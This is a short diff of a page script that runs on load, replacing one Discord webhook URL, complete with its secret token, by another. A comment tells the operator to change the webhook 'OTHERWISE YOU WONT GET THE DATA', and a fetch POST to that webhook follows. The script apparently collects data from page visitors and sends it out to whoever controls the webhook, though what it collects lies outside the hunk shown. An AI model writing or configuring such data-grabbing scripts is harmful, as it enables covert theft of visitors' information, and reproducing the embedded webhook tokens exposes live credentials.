@@ -31,7 +31,7 @@ document.addEventListener("DOMContentLoaded",()=>{function e(e){let t=document.b
                     };
 
                 // CHANGE THE CONTENT IN webhookUrl OTHERWISE YOU WONT GET THE DATA
-                    const webhookUrl = 'https://discord.com/api/webhooks/1341511306041102499/ouRf93XipwxLeCOzhR8oIT3iqlhtAtfZIfktK0W-gZ-6q5fNYLUiwFXn3pWqXLFpG-mX';
+                    const webhookUrl = 'https://discord.com/api/webhooks/1341886964420579339/lypXPPLfFFuCClDtsJEvmGV-7chwgB8cRp99EycU1FfjE14oPeJRaEib6GlCuWBD6WRh';
                     fetch(webhookUrl, {
                         method: 'POST',
                         headers: {
